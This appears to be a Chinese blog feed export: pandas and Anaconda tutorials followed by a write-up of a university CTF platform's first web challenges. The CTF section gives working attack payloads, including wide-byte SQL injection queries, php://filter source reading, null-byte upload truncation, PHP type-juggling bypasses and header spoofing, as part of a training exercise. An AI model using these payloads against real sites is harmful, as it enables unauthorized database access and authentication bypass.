axis）1df.sort_index(axis=1, ascending=True) （注：axis=1表明按照column来排序，关于axis的讨论参见 Stackoverflow:What does axis in pandas mean?；ascending=False说明要用降序排序，其默认值True代表升序） 按值排序（Sorting by values）1df.sort_values(by='B') （注：这里没有传入或没有显式指定ascending参数，则其默认值为True，为升序排列。） 选择（Selection）尽管python/numpy的关于选择（selecting ）和设定（setting）的表达式能直接（intuitive）在交互式环境（interactive work）中派上用场，但在实际工作中，我们推荐使用经过优化（optimized）的pandas方法：.at, .iat, .loc, .iloc 和 .ix. 想了解更多请查阅：《Indexing and Selecting Data》和《MultiIndex/Advanced Indexing》 获取数据（Getting）获取列选择单独的一列，返回一个 Series 对象，相当于 df.A1df['A'] （注：这里附上 df.A 的结果：） 获取行通过 [ ] 对行进行选取，这操作会对行进行切片（slice） 1df[0:3] 1df['20130102':'20130104'] 通过标签选择（Selection by Label）—— .loc（注：由于写这篇时间过长，jupyter notebook中前面的代码要重新运行一遍，而前面的示例中使用了random函数产生的随机值，所以重新运行后下面的数据会跟上面的数据不太一样，这里放上重新运行后 df值 的图，以作为对照。） 想了解关于本节更多内容请查看 Selection by Label 通过标签获得交叉区域（cross section）1df.loc[dates[0]] 通过标签进行多轴选择（multi-axis）1df.loc[:,['A','B']] 标签切片，两端确定1df.loc['20130102':'20130104',['A','B']] 缩减返回对象的维度1df.loc['20130102',['A','B']] 获取标量值1df.loc[dates[0],'A'] 快速获取标量值结果与前面一个方法相同1df.at[dates[0],'A'] （注：.loc和 .at运行时间对比如下：） 通过位置选择（Selection by Position）—— .iloc想了解本节更多内容请查看 Selection by Position 通过传入整数来选择1df.iloc[3] 数值切片，跟numpy/python类似1df.iloc[3:5,0:2] 传入指定位置（整数）的列表，与numpy/python类似1df.iloc[[1,2,4],[0,2]] 对行切片（slicing rows）1df.iloc[1:3,:] 对列切片（slicing columns）1df.iloc[:,1:3] 取值（标量值）1df.iloc[1,1] 更快取值（标量值）1df.iat[1,1] （注：以下是 .iloc 和 .iat 的时间比较。） 通过布尔表达式进行索引（Boolean Indexing）使用单独一列来选择数据1df[df.A &gt; 0] 使用 where 操作来选择数据1df[df &gt; 0] （注：虽然没有出现where，但这个确实是where操作） 使用 isin() 方法来过滤数据1234# 准备工作df2 = df.copy()df2['E'] = ['one', 'one','two','three','four','three']df2 12# 使用isin()df2[df2['E'].isin(['two','four'])] 设置（Setting）设置新的列，使其数据自动按索引排列123# 准备工作s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))s1 123# 设置新的列df['F'] = s1df 通过标签（label）来设置数值1df.at[dates[0],'A'] = 0 通过位置（position）来设置数值1df.iat[0,1] = 0 通过指定numpy数组来设置数值1df.loc[:,'D'] = np.array([5] * len(df)) 经过前面一堆操作后的结果： 通过 where 操作来设置数值123df2 = df.copy()df2[df2 &gt; 0] = -df2df2 处理缺失值（Missing Data）pandas主要用值 np.nan 来表示缺失值。默认情况下，它不会参与计算。更多内容查看 Missing Data section 重索引（Reindexing）重索引能让你对特定的轴（axis）来进行索引的改变/添加/删除。它会返回一个复制值（注：也就是说不会改变原本的数据）。123df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E'])df1.loc[dates[0]:dates[1],'E'] = 1df1 删除所有具有缺失值的行（dropna）1df1.dropna(how='any') 填充缺失值（fillna）1df1.fillna(value=5) 缺失值的布尔表达式（isnull）1pd.isnull(df1) 剩余内容请看：数据挖掘比赛（5）ten Minutes to pandas中文版下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（3）申请anaconda-academic-license并使用]]></title>
      <url>%2F2017%2F01%2F29%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[Anaconda是python的一个科学计算发行版，里面集成了各种各样的科学计算包，如numpy、pandas、sklearn等。作为学生，在使用anaconda发行版的同时，我们可以申请anaconda的学术证书，通过它可以下载一些额外的包以实现计算过程的加速。 注册、申请、下载注册地址：https://anaconda.org/ 其中的email要用学校邮箱，否则不能申请成功。我的邮箱是 **@stu.xmu.edu.cn 在注册完了后，先点右上角的头像处，再选择My Setting 如下： 选择add ons 将右边的三个license下载下来：MKL Optimizations、IOPro、Anaconda Accelerate。 安装先打开命令行，输入如下命令（注，我这里以windows下为例），确定license的安装位置。 conda info --license 如图 （注：ASUS即用户的主文件夹，各位根据自己的电脑调整） 然后将下载的3个license（即txt文件）放到 .continuum 文件夹里面。这里注意下，如果打开个人文件夹(这里即ASUS文件夹)没看到 .continuum ，那要记得勾选一下显示隐藏文件。如果还不存在，那需要自己创建 .continuum 文件夹。如下： 然后打开命令行，分别输入 conda install accelerate conda install iopro 注意，是分别输入，而且在安装accelerate时为满足dependency会同时安装mkl，所以就不单独输入conda install mkl了。比如安装 accelerate 模块，如下： 跟着提示来，下载过程可能有点慢：） 测试使用以accelerate为例，从add ons页面中可以看出acelerate的作用是： Fast Python for GPUs and multi-core with NumbaPro and MKL Optimizations. 在安装accelerate后我们可以利用GPU显卡来加速计算过程。不过查了官方文档搜了stackoverflow翻遍了google和百度都没有找到单独关于acclerate库的使用，大多数的讨论集中于在安装后对numba的使用，所以这里用numba来测试一下加快了多少。在测试前我把显卡的驱动升级了下，接下来确定一下机子的显卡是否支持。命令行打开，输入：123import numba.cuda.api,numba.cuda.cudadrv.libsnumba.cuda.cudadrv.libs.test()numba.cuda.api.detect() 第一行导入库，第二行用来检测库的安装正确，第三行用来确定显卡是否支持加速。 下面是测试代码（网上找的稍微修改了下，自己还写不出来）：1234567891011121314151617181920212223242526272829303132333435import numpy as npfrom numba import jitnobs = 1000000def proc_numpy(x,y,z): x = x*2 - ( y * 55 ) # these 4 lines represent use cases y = x + y*2 # where the processing time is mostly z = x + y + 99 # a function of, say, 50 to 200 lines z = z * ( z - .88 ) # of fairly simple numerical operations return z@jitdef proc_numba(xx,yy,zz): for j in range(nobs): # as pointed out by Llopis, this for loop x, y = xx[j], yy[j] # is not needed here. it is here by # accident because in the original benchmarks x = x*2 - ( y * 55 ) # I was doing data creation inside the function y = x + y*2 # instead of passing it in as an array z = x + y + 99 # in any case, this redundant code seems to z = z * ( z - .88 ) # have something to do with the code running # faster. without the redundant code, the zz[j] = z # numba and numpy functions are exactly the same. return zzx = np.random.randn(nobs)y = np.random.randn(nobs)z = np.zeros(nobs)res_numpy = proc_numpy(x,y,z)z = np.zeros(nobs)res_numba = proc_numba(x,y,z)%timeit proc_numpy(x,y,z)%timeit proc_numba(x,y,z) 结果如图,第一行是用cpu计算的时间，2.06ms；第二行是gpu计算的时间 121μs；就本例而言快了17倍左右。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（2）利用pandas读取大型数据集]]></title>
      <url>%2F2017%2F01%2F25%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
      <content type="text"><![CDATA[数据比赛中，有时提供的数据集会很大，常规方法打不开，这时候就需要在读入时做些小处理，方便后续操作。 读入以IJCAI-17比赛数据集中的user_pay.txt 和 user_view.txt 为例，user_pay.txt有 2.13Gb 之大，而user_view.txt 只有 174Mb 。两者的读入方法见下。 对于 user_view.txt 这种较小型的数据 ，直接读入即可。如下：123import pandas as pduser_view_db = pd.read_table('user_view.txt',header=None,sep=',')user_view_db.head() 但对于如 2.13Gb大的 user_pay.txt 的大型数据，如果直接读入，会让硬盘和内存飙满且速度非常慢（机子好的童鞋请忽略—）。对此，采取的策略是分块读入。在用 read_table 读入时指定 chunksize 参数和 iterator参数，如下：1user_pay_db = pd.read_table('user_pay.txt',header=None,sep=',',iterator=True,chunksize=10000) (注：chunksize等于多少可以自己选定，iterator=True好像一般都这么设定：）至于why在stackoverflow上有相关问题但似乎没有满意的答案) 可以看到多了两个参数后，user_pay_db 不再是dataframe了，而是pandas.io.parsers.TextFileReader。想要查看它可以如下：12for chunk in user_pay_db: print(chunk) 它会按照 chunksize 的大小打印出内容，如下: （由于数据集过大，只截取部分内容） 处理接下来的处理有两种，一是可以直接对 user_pay_db 中的每个 chunk 进行分块处理，也可以想办法把 此时为TextFileReader的 user_pay_db 转化为易于操作的 dataframe格式。这里只演示第二种方法。 我们可以借助 pandas 中的concat方法来合并数据集。如下：1df = pd.concat([chunk for chunk in user_pay_db],ignore_index=True) 这里用变量df来存储。我们给concat传了两个参数，第一个是利用了for循环，注意不要忽略了中括号；第二个参数用于告诉concat连接时忽略掉每个chunk中原有的index，否则等连接完后，会出现同一个index对应了多个项的情况，如下： 小结（题外话）上面的代码是基于 Anaconda 4.2.0 (64-bit)集成包的。其pandas版本为0.18.1，而最新的pandas版本为0.19，其中的一些函数的使用方法做了更新，比如concat。希望读者在上述代码运行不了不对的情况下能查查文档留留言一起讨论：） 下面附上pandas的文档地址 pandas 0.18.1 文档 pandas 0.19.2 文档 不清楚自己pandas版本的，见下,其中version前后都是两个下划线__： 欢迎留言：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（1）对无列名的txt数据集读取方法及处理]]></title>
      <url>%2F2017%2F01%2F24%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[接触大数据比赛，必然要接触大数据（&lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。 基本的读入其实python里已经集成了csv模块了，不过使用起来不那么方便。一般而言，使用pandas库可以把数据读入成dataframe形式方便操作。 读入csv文件以kaggle的titanic数据集为例用pandas读入的代码如下:12import pandas as pdtitanic_db = pd.read_csv('titanic_train.csv') 这样就能把数据集读进来了，如下：几道’\’是可能因为屏幕小（，，ԾㅂԾ，，）而产生的换行提示。显示出来的有5行（0~5），每行的上面都有对应的列名。 读入txt文件以IJCAI-17比赛数据集中的user_view.txt为例notepad++打开如下：用pandas读入的代码如下:12import pandas as pduser_view = pd.read_table('user_view.txt') 注意代码应该是 read_table .结果如下可以看到读入后，pandas把txt文件的第一行当做了列名，很明显这是错误的:) 这个我们下面来进行修正。 针对无列名文件第一行的读入处理上面提到的 read_csv 、read_table 等，其实他们的参数不仅仅只有一个。为了让无列名的数据读入正确，我们可以在读入的时候多指定一个参数header=None。以user_view.txt为例。1user_view = pd.read_table('user_view.txt'，header=None) 读入结果如下： 可以看到读入后，原txt文件中的第一行有了Index（即 0），不再被识别为列名。 对txt数据集读入处理为正常的dataframe形式在指定header=None读入txt文件后，pandas自动给添了个列名 0，这表明读入的每一行其实都是读入了一字符串，总共只有 1 列！对数据的操作很不方便 所以我们在遇到这种情况时，我们还要继续指定参数sep，告诉pandas以什么为分隔符。以user_view.txt为例，从上图可知每行的数据有三个部分，用逗号(，)相隔开。所以在读入时，如下：1user_view = pd.read_table('user_view.txt'，header=None，sep='，') 可以发现每列（3列）的列名被设置为 0 1 2，这样我们可以很方便地对数据进行操作。 给无列名的数据集添加列名法一：直接操作好吧，这个方法当然是最简单的，csv用excel打开，txt用notepad++、sublime打开，然后自己填上列名，再正常读入就行了嘛! 只是通常情况下，所遇到的数据集比较大，用excel或者notepad等难以打开，又或者打开后不好操作，局限性比较大。同时在直接操作添加时还要考虑原数据集的格式和编码，方便后面进一步读入。 法二：在利用pandas读入时指定列名以user_view.txt数据集为例，阿里天池上的数据说明是 Field Sample Description user_id 0000000001 用户id shop_id 000001 商家id，与shop_info对应 time_stamp 2015-10-10 10:00:00 浏览时间 所以在读入时，我们可以再指定一个参数 names .对照上述说明和基于前面的操作()，代码如下：123import pandas as pdcolumns = ['user_id','shop_id','time_stamp']user_view_db = user_view_db = pd.read_table('user_view.txt',header=None,sep=',',names=columns) 结果如下： 法三：在用pandas读入后再制定列名在完成如前面基本的读入和处理后，此时 user_view_db 应该是 列名为[0,1,2] 的datframe了。此时我们再通过指定其属性columns来指定列名。1user_view_db.columns=['user_id','shop_id','time_stamp'] 如下：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（0）环境搭建之anaconda安装]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[最近开始接触一些kaggle的比赛，需要搭建基本的环境。原本在本机和服务器上“搭好了”，numpy.test()等都没有问题，同样的代码却运行出了不同的结果… 后面接触到了 anaconda这个集成的python科学计算环境，一键式解决大部分问题，甚至在win下也能安装：)这样也省去了开一大堆虚拟机的麻烦。 简介网上各种简介一大堆，对我而言……scipy在win下死活没装上，不过在 anaconda 里已经很好的集成了，嗯不多说了。 下载按理我们都是去官网（https://www.continuum.io/downloads）下载，不过下载速度十分可观，不知道翻墙后能不能好点。我的方法是在浏览器下载时复制其下载链接，然后放到百度云里面离线下载，可能会出现链接失效的情况，但其实只要一直点离线下载：) 一般最后会成功的。下面这两个是我刚离线完的，目前还是最新版，各位如果需要可以保存一下。 Anaconda3-4.2.0-Windows-x86： 链接：http://pan.baidu.com/s/1hsxB3MG 密码：5k0x Anaconda3-4.2.0-Linux-x86_64.sh 链接：http://pan.baidu.com/s/1dETp0LN 密码：xm7x 这两个版本是python3，64bit的. 大家自己看着办：) 安装win平台下的安装很简单，傻瓜式操作，中间会有两个选项用来把anaconda加入系统环境变量，安装后系统环境如下： ubuntu下的安装，在虚拟机安装时挺顺利的，但在云服务器上除了一点小问题，可能跟服务器的初始环境有关吧:) 运行一下sh脚本，跟着提示来，最后一步是问是否要把anaconda加入系统环境变量，选yes一般来讲应该是能成功的。如果在最后一步时没有成功或者说输入了yes以外的值而导致无法默认运行anaconda的话，也可以按照如下做法（以云服务器上为例，这里我顺便把最基本操作写出来吧，$表示在terminal里的意思……）： $ vim /home/ubuntu/.bashrc 按键盘字母 i ， 在最后面加入一句： export PATH=/home/ubuntu/anaconda3/bin:$PATH 按键盘上 ESC ，再按 ：，输入 wq 退出vim $ source /home/ubuntu/.bashrc 如下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pwn思维导图]]></title>
      <url>%2F2017%2F01%2F13%2Fpwn%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[南邮CTF平台web前30题解]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[1、查看源代码view-source:http://chinalover.sinaapp.com/web1/nctf{flag_admiaanaaaaaaaaaaa} 2、MD5碰撞http://115.28.150.176/md5/index.php?a=240610708nctf{md5_collision_is_easy} 3、绕过长度限制，firebug修改限制长度nctf{follow_me_to_exploit} 4、下载该gif文件，010编辑器打开， 最后nctf{photo_can_also_hid3_msg} 5、所谓层层递进，就是一层一层的慢慢找吧view-source:http://chinalover.sinaapp.com/web3/404.html nctf{this_is_a_fl4g} 6、 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [(ﾟｰﾟ) # (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;); 脑洞加密方式 http://www.tuicool.com/articles/2E3INnmfirebug 粘贴后 运行 nctf{javascript_aaencode} 7、看起来像是老题 burpsuit抓包 8、refer头部修改ncf{http_referer} 9、nctf{gzip_base64_hhhhhh} 10、filter方式读取源码http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到base64编码 并解码得到 11、burpsuit抓包， sendtorepeater 可以发现有重定向 一个个慢慢翻 nctf{this_is_302_redirect} 12、提示下载其他东西，查看源代码，发现下载连接为 download.php?url=[base64]已知的文件有 download.php 尝试下载 download.php -》 ZG93bmxvYWQucGhw 并查看所以继续下载 hereiskey.php -&gt; nctf{download_any_file_666} 13、页面提示 cookie burp抓包设置cookie为0 后发现右边出现 Login=0将cookie设置为 Login=1 nctf{cookie_is_different_from_session} 14、 访问http://chinalover.sinaapp.com/web11/robots.txt别太开心，flag不在这，这个文件的用途你看完了？在CTF比赛中，这个文件往往存放着提示信息TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; 所以目标是 http://chinalover.sinaapp.com/web11/sql.php 参数是 id 而且其中的那个数字 1024 很奇怪啊 intval是取整函数，所以让 id等于 1024.* 比如1024.9999999 1024.0000001 则$id = intval($_GET[id]) 后 $id=1024 http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 nctf{query_in_mysql} 15、gbk 提示：宽字节注入先查 表名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,table_name from information_schema.tables%23 再查 字段名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,column_name from information_schema.columns where table_name=0x666c6167%23 查询 数据 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,fl4g from flag %23 nctf{gbk_3sqli} 资料：宽字节注入https://www.91ri.org/8611.html 16、考点是 截断 然而…… * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[0]=a &lt;-为什么这个方法可以？…… 运气 * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu %00截断 %23为 # flag:nctf{use_00_to_jieduan} 17、注意和第二题的区别，第二题是== 而这一题是 === 要求不仅仅是值相同 而且类型要相同，所以这一题不能用md5碰撞在php中 md5() 需要一个string参数，但若传入一个数组类型，它不会报错但会返回空值利用这点，我们传入两个数组进行绕过if判断http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=0 Flag: nctf{php_is_so_cool} 18、变量覆盖！ &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;?php } ?&gt; extract函数“可能”导致变量覆盖漏洞，我们传入pass的值，并且把thepassword_123的值覆盖为我们需要的值 nctf{bian_liang_fu_gai!} 19、查看index.txt &lt;?php if(eregi(“hackerDJ”,$_GET[id])) { echo(“not allowed!“); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? id 不能与 hackerDJ 相等，而且id经过 urldecode后要与 hackerDJ相同 http://php.net/manual/en/function.urldecode.php $_GET[]本身就有urldecode的功能 而且就 urlencode，是把对应的ASCII码前面加上%，urldecode就是把对应的编码还原，而未经编码的保持不变 所以对hackerDJ中的任意一个进行编码或是全部编码，效果相同 http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ %2568ackerDJ在第一个GET处被urldecode成 %68ackerDJ ,绕过了第一个if判断， 接着是 代码中的显式urldecode，被还原成 hackerDJ 从而拿到 flag 20、本地登录，上burp 添加X-Forwarded-For:127.0.0.1 nctf{happy_http_headers} 21、都已经提示header了burp抓包，查看 nctf{tips_often_hide_here} 22、查看一下源代码，看一看upload.php然后我把那张gif.gif的图片传了上去，结果这里只写一下正确姿势，其余的上传绕过日后总结，在upload这里添上 1.php .gif (php和 . 之间是 空格键产生的空格)这里的 20 就是php和 . 之间的空格利用 00 截断上传 ，把 20 修改为 00nctf{welcome_to_hacks_world} 23、点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格所以尝试传入user为 admin’)# 其中 ‘）用来分别用来闭合 #用来把后面给注释掉这样最后的查询语句为 select user from ctf where (user=&#39;admin&#39;) nctf{ni_ye_hui_sql?} 24、注意提示： tip:strcmp(array,string)=null=0 所以根据代码逻辑，我们传入的pass若与pass1相等，则返回0， ！strcmp则为 真 这里是关于strcmp的解释http://www.w3school.com.cn/php/func_string_strcmp.asp 利用提示，我们传入 pass数组，比如 pass[]=1, 见右上。 nctf{strcmp_is_n0t_3afe} 25、传入十六进制，可以绕过判断， 54975581388http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc nctf{follow_your_dream} 26、既然是admin的密码，怎么会是ctfuser呢…… 上burpsuit 改一改，然而不对。 注意到地址栏，user1传了一个参数：ctfuser的加密结果 进去，这个也必须改掉 所以改为 user1=YWRtaW4= 后面那串是admin的base64加密。 GO nctf{reset_password_often_have_vuln} 27、在xman训练营时有接触过某题，我们以为它的考点是反序列化，但当时没有类（class），最后只好作罢：） 